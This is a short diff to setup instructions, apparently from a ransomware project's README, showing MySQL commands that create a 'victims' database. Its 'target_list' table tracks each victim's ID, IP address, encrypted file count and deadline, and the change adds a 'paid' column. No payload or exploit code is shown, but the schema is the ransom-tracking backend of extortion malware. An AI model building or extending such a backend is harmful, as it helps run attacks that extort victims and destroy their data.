@@ -54,7 +54,7 @@
  - $ mysql -u [user] -p
  - $ create database victims;
  - $ use victims;
- - $ create table target_list (id int(6) unsigned auto_increment primary key, unique_id varchar(16) not null, target_ip varchar(30), file_count int not null, curr_time timestamp not null, exp_time timestamp not null, time_expired bool not null);
+ - $ create table target_list (id int(6) unsigned auto_increment primary key, unique_id varchar(16) not null, target_ip varchar(30), file_count int not null, curr_time timestamp not null, exp_time timestamp not null, time_expired bool not null, paid bool not null);
  - $ exit
 
 ## What to do on the client-side
